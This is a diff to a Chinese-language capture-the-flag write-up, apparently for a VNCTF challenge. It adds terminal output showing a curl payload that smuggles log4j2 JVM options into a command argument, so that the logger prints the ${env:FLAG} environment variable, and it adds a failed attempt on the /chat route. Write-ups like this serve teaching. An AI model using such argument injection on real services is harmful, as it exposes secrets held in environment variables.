@@ -253,13 +253,22 @@ java_command = [
 ```
 这句就是打印一次日志信息，原本是要打印`("msg: {}", args)`,但是由于我们注入的第二个参数
 日志格式被替换了，所以可以输出flag。
-
+## payload
 所以最后payload：
 ```bash
-curl -X POST  http://challenge.ilovectf.cn:30295/  -d "text=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG} "
+┌──(root💀JYli)-[~]
+└─# curl -X POST  http://challenge.ilovectf.cn:30295/  -d "text=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG} "   
+都说了好感度不够了啦╮(￣⊿￣)╭
+08:21:37.550 INFO  com.ctf.chatrobot.App executing /weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=VNCTF{LO6_10r_J_1s_1UN_N8jqBDO} - msg:  
 ```
 
+## 一点疑惑
 最后有点疑惑是为什么不能打`/chat`路由，试了一下日志都不能回显
+```bash
+┌──(root💀JYli)-[~]
+└─# curl  http://challenge.ilovectf.cn:30295/chat\?cmd=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG}         
+都说了好感度不够了啦╮(￣⊿￣)╭#    
+```
 好像是因为`/chat`路由：
 ```python
 result = chat(cmd, arg)
